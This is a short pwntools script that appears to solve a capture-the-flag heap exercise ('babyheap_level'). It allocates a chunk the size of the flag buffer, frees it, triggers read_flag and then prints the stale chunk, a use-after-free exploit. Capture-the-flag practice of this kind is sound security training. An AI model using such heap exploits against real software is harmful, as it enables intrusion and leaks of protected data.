from pwn import *
from sys import argv




def malloc(size):
    p.sendlineafter(b"[*] Function (malloc/free/puts/read_flag/quit): ",'malloc'.encode())
    p.sendlineafter(b"Size: ",size.encode())
    return

def free() :
    return p.sendlineafter(b"[*] Function (malloc/free/puts/read_flag/quit): ",'free'.encode())

def read_flag():
    return p.sendlineafter(b"[*] Function (malloc/free/puts/read_flag/quit): ",'read_flag'.encode())

def puts():
    return p.sendlineafter(b"[*] Function (malloc/free/puts/read_flag/quit): ",'puts'.encode())

def quit():
    return p.sendlineafter(b"[*] Function (malloc/free/puts/read_flag/quit): ",'quit'.encode())

p = process("/challenge/babyheap_level" + argv[1])

# size of the flag buffer   

malloc(str(218))

free()

read_flag()

puts()

p.interactive()

p.close()